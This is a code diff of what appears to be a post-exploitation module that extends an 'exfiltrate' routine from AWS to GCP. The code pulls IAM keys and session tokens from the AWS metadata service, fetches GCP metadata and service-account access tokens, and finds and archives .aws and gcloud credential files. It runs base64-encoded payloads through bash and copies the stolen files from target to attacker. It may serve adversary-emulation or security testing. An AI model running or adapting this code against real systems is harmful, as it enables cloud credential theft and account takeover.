@@ -47,73 +47,113 @@ class Module(BaseModule):
                     cwd="/tmp", timeout=900)
                 log(result)
 
-            def exfiltrate():
+            def exfiltrate(csp):
                 # create an instance profile to exfiltrate
-                payload = base64.b64encode('''
-opts="--no-cli-pager"
-INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
-AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-cat > .aws-ec2-instance <<-EOF
-AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
-AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
-AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
-AWS_DEFAULT_REGION=us-east-1
-AWS_DEFAULT_OUTPUT=json
-EOF
-PROFILE="instance"
-aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
-aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
-aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
-aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
-aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
-                log("creating an instance creds profile...")
-                result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
-                log(result)
+                if csp == "aws":
+                    payload = base64.b64encode('''
+    opts="--no-cli-pager"
+    INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
+    AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    cat > .aws-ec2-instance <<-EOF
+    AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
+    AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
+    AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
+    AWS_DEFAULT_REGION=us-east-1
+    AWS_DEFAULT_OUTPUT=json
+    EOF
+    PROFILE="instance"
+    aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
+    aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
+    aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
+    aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
+    aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
+                    log("creating an instance creds profile...")
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
+                        cwd="/tmp", timeout=900)
+                    log(result)
 
-                # remove any pre-existing cred archived
-                if session.platform.Path('/tmp/aws_creds.tgz').exists():
-                    session.platform.unlink('/tmp/aws_creds.tgz')
+                    # remove any pre-existing cred archived
+                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
+                        session.platform.unlink('/tmp/aws_creds.tgz')
 
-                # create an archive of all aws creds
-                payload = base64.b64encode(
-                    b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
-                log("running credentials find...")
-                result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
-                log(result)
+                    # enumerate aws creds
+                    payload = base64.b64encode(
+                        b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
+                    log("running credentials find...")
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
+                        cwd="/tmp", timeout=900)
+                    log(result)
 
-                # create an archive of all aws creds
-                payload = base64.b64encode(
-                    b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
-                log("payload loaded and ready")
-                result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
-                log(result)
+                    # create an archive of all aws creds
+                    payload = base64.b64encode(
+                        b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
+                    log("payload loaded and ready")
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
+                        cwd="/tmp", timeout=900)
+                    log(result)
+                elif csp == "gcp":
+                    # get instance metadata
+                    payload = base64.b64encode(
+                        b'''curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google" > /tmp/instance_metadata.json''')
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancemetadata | base64 -d | /bin/bash'",
+                        cwd="/tmp", timeout=900)
+                    log(result)
+                    # get instance token
+                    # example usage: curl https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances -H "Authorization":"Bearer ACCESS_TOKEN"
+                    payload = base64.b64encode(
+                        '''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
+                        echo $ACCESS_TOKEN > /tmp/instance_access_token.json
+                        ''')
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancetoken | base64 -d | /bin/bash'",
+                        cwd="/tmp", timeout=900)
+                    log(result)
 
-                # cleanup any existing local cred archives for this host
-                if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
-                    os.unlink(f'/tmp/{hostname}_aws_creds.tgz')
+                    # remove any pre-existing cred archived
+                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
+                        session.platform.unlink('/tmp/aws_creds.tgz')
 
-                # transfer files from target to attacker
-                log("copying /tmp/aws_creds.tgz...")
-                with session.platform.open('/tmp/aws_creds.tgz', 'rb') as f1:
-                    with open(f'/tmp/{hostname}_aws_creds.tgz', 'wb') as f2:
-                        f2.write(f1.read())
+                    # enumerate gcp creds
+                    payload = base64.b64encode(
+                        b"find / \( -type f -a \( -name 'credentials.json' -a -path '*.config/gcloud/credentials.json' \) \)  -printf '%P\n'")
+                    log("running credentials find...")
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcredsfind | base64 -d | /bin/bash'",
+                        cwd="/tmp", timeout=900)
+                    log(result)
 
-                log("copying /tmp/linpeas.txt...")
-                with session.platform.open('/tmp/linpeas.txt', 'rb') as f1:
-                    with open(f'/tmp/{hostname}_linpeas.txt', 'wb') as f2:
-                        f2.write(f1.read())
+                    # create an archive of all gcp creds
+                    payload = base64.b64encode(
+                        b"tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials.json' -a -path '*.config/gcloud/credentials.json' \) \)  -printf '%P\n')")
+                    log("payload loaded and ready")
+                    result = session.platform.run(
+                        f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcreds | base64 -d | /bin/bash'",
+                        cwd="/tmp")
+                    log(result)
 
-                # remove temporary archive from target
-                if session.platform.Path('/tmp/aws_creds.tgz').exists():
-                    session.platform.unlink('/tmp/aws_creds.tgz')
+                # copy files
+                files = [f"/tmp/{csp}_creds.tgz",
+                         "/tmp/linpeas.txt",
+                         "/tmp/instance_access_token.json",
+                         "/tmp/instance_metadata.json"]
+                for file in files:
+                    if session.platform.Path(file).exists():
+                        log(f"copying {file}...")
+                        if Path(f'/tmp/{hostname}_{csp}_{os.path.basename(file)}').exists():
+                            os.unlink(
+                                f'/tmp/{hostname}_{csp}_{os.path.basename(file)}')
+                        with session.platform.open(file, 'rb') as f1:
+                            with open(f'/tmp/{hostname}_{csp}_{os.path.basename(file)}', 'wb') as f2:
+                                f2.write(f1.read())
+                        session.platform.unlink(file)
+                    else:
+                        log(f"file not found: {file}")
 
             def credentialed_access_tor(csp, jobname, cwd, script):
                 # start torproxy docker
@@ -200,7 +240,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                         shutil.rmtree(gcp_dir)
                     gcp_dir.mkdir(parents=True)
 
-                    # extract the first set aws creds
+                    # extract the first set gcp creds
                     file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
                     for m in file.members:
                         if m.isfile() and (m.path.endswith('/.config/gcloud/credentials.json')):
